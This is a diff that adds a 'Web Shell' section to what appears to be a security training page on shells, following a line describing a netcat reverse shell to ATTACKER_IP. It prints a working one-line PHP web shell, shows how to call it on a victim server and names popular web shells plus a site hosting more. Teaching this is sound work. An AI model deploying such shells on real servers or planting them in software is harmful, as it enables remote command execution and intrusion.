@@ -338,3 +338,39 @@ Terminal
 - This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.
 
 ## Web Shell
+
+
+A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.
+
+Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts. 
+
+Example PHP Web Shell
+
+Let’s look at an example PHP web shell to understand how this process works:
+```
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+The above shell can be saved into a file with the PHP extension, like shell.php, and then uploaded into the web server by the attacker by exploiting vulnerabilities such as Unrestricted File Upload, File Inclusion, Command Injection, among others, or by gaining unauthorized access to it. 
+After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, in this example http://victim.com/uploads/shell.php. As we observed from the code in shell.php, we need to provide a GET method and the value of the variable cmd, which should contain the command the attacker wants to execute. For example, if we want to execute the command whoami the request to the URL should be:
+http://victim.com/uploads/shell.php?cmd=whoami
+The above will execute the command whoami and display the result in the web browser.
+
+Existing Web Shells Available Online
+
+The power of supported languages by the web servers can result in web shells with lots of functionality and avoid detection at the same time. Let's explore some of the most popular web shells that can be found online 
+
+    p0wny-shell - A minimalistic single-file PHP web shell that allows remote command execution.
+
+    The image is a screenshot of the web shell p0wny-shell showing commands being executed in a GUI similar to a real terminal
+    b374k shell - A more feature-rich PHP web shell with file management and command execution, among other functionalities.
+
+    The image is a screenshot of b374k shell displaying the file manager feature that allows to manipulate files
+    c99 shell - A well-known and robust PHP web shell with extensive functionality.
+
+    The image is a screenshot of c99 shell displaying the command execution feature and the file manipulation one
+
+You can find more web shells at: https://www.r57shell.net/index.php.
